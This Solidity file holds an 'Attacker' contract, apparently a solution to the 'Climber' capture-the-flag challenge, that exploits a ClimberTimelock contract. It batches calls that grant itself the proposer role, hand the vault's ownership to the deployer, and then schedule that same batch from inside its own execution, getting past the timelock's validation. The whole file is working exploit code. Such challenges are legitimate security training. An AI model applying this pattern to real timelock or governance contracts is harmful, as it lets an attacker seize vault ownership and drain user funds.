// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";

contract Attacker {
    ClimberTimelock private timelock;

    address[] private targets = new address[](3);
    uint256[] private values = [0, 0, 0];
    bytes[] private elements = new bytes[](3);

    constructor(address payable _timelock, address _vault) {
        timelock = ClimberTimelock(_timelock);

        targets = [_timelock, _vault, address(this)];
        elements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        elements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        elements[2] = abi.encodeWithSignature("schedule()");
    }

    function schedule() external {
        timelock.schedule(targets, values, elements, keccak256(""));
    }

    function attack() external {
        timelock.execute(targets, values, elements, keccak256(""));
    }
}
